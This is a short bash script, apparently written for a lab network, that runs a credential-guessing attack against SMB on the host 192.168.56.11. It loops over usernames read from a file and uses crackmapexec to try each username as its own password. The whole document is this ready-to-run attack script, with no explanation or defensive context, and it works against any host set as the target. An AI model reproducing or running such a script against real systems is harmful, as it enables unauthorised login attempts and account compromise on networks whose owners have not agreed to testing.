#!/bin/bash

# Target IP
TARGET_IP="192.168.56.11"

# Read usernames from a file
USERNAMES=$(cat userlist.txt)

# Loop through each username
for USER in $USERNAMES; do
    echo "Trying $USER:$USER ..."
    crackmapexec smb $TARGET_IP -u "$USER" -p "$USER"
done
